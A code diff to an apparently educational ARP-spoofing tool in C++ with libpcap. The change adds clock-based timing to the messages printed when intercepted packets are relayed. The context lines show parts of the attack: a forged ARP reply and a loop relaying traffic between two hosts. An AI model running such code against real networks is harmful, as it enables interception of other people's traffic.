@@ -1,5 +1,6 @@
 #include <cstdio>
 #include <pcap.h>
+#include <time.h>
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "ipv4hdr.h"
@@ -138,7 +139,9 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
   cout << "target_mac: " << string(target_mac) << " sender mac: " << string(sender_mac) << '\n';
   send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
   
-  while (true) {	
+  while (true) {
+    clock_t start = clock();
+
     struct pcap_pkthdr* header;
 		const u_char* packet;
     int res = pcap_next_ex(handle, &header, &packet);
@@ -163,7 +166,7 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
 	    if (res != 0) {
 		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	    } else {
-        printf("packet relayed with %d bytes\n", header->caplen);
+        printf("packet relayed with %d bytes, took %f times\n", header->caplen, (double)(clock() - start));
       }
     } else if (spoof_packet->eth_.smac() == target_mac && spoof_packet->eth_.dmac() == current_mac) {
       // target -> me -> sender
@@ -174,7 +177,7 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
 	      if (res != 0) {
 		      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	      } else {
-          printf("packet replyed with %d bytes\n", header->caplen);
+          printf("packet replyed with %d bytes, took %f times\n", header->caplen, (double)(clock() - start));
         }
       }
     }
